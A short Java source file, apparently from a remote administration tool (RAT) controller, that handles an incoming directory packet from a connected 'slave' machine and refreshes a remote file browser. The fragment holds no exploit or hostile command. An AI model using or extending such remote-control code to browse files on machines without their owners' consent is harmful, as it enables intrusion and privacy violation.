package com.redpois0n.packets.in;


import java.io.DataInputStream;

import com.redpois0n.Slave;
import com.redpois0n.packets.out.Header;
import com.redpois0n.ui.frames.FrameRemoteFiles;

public class PacketDIR extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String where = slave.readLine().replace("/", slave.getFileSeparator()).replace("\\", slave.getFileSeparator());

		FrameRemoteFiles frame = FrameRemoteFiles.instances.get(slave);
		if (frame != null) {
			frame.txtDir.setText(where);
			while (frame.model.getRowCount() > 0) {
				frame.model.removeRow(0);
			}
			slave.addToSendQueue(new PacketBuilder(Header.LIST_FILES, where ));
		}
	}

}
